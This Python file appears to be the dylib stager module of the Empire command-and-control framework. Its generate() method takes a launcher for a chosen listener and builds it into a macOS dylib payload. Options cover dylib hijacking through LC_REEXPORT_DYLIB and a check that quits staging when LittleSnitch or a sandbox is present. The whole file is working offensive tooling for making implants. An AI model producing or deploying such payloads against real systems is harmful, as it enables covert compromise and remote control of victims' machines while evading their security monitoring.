import logging

from empire.server.common import helpers

log = logging.getLogger(__name__)


class Stager:
    def __init__(self, mainMenu):
        self.info = {
            "Name": "dylib",
            "Authors": [
                {
                    "Name": "Chris Ross",
                    "Handle": "@xorrior",
                    "Link": "https://twitter.com/xorrior",
                }
            ],
            "Description": "Generates a dylib.",
            "Comments": [""],
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            "Listener": {
                "Description": "Listener to generate stager for.",
                "Required": True,
                "Value": "",
            },
            "Language": {
                "Description": "Language of the stager to generate.",
                "Required": True,
                "Value": "python",
                "SuggestedValues": ["python"],
                "Strict": True,
            },
            "Architecture": {
                "Description": "Architecture: x86/x64",
                "Required": True,
                "Value": "x86",
            },
            "SafeChecks": {
                "Description": "Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.",
                "Required": True,
                "Value": "True",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "Hijacker": {
                "Description": "Generate dylib to be used in a Dylib Hijack. This provides a dylib with the LC_REEXPORT_DYLIB load command. The path will serve as a placeholder.",
                "Required": True,
                "Value": "False",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "OutFile": {
                "Description": "Filename that should be used for the generated output.",
                "Required": True,
                "Value": "empire.dylib",
            },
            "UserAgent": {
                "Description": "User-agent string to use for the staging request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
        }

        self.mainMenu = mainMenu

    def generate(self):
        language = self.options["Language"]["Value"]
        listener_name = self.options["Listener"]["Value"]
        user_agent = self.options["UserAgent"]["Value"]
        arch = self.options["Architecture"]["Value"]
        hijacker = self.options["Hijacker"]["Value"]
        safe_checks = self.options["SafeChecks"]["Value"]

        if arch == "":
            print(helpers.color("[!] Please select a valid architecture"))
            return ""

        launcher = self.mainMenu.stagergenv2.generate_launcher(
            listener_name,
            language=language,
            user_agent=user_agent,
            safe_checks=safe_checks,
        )

        if launcher == "":
            print(helpers.color("[!] Error in launcher command generation."))
            return ""

        launcher = launcher.removeprefix("echo ")
        launcher = launcher.removesuffix(" | python3 &")
        launcher = launcher.strip('"')
        return self.mainMenu.stagergenv2.generate_dylib(
            launcher_code=launcher, arch=arch, hijacker=hijacker
        )
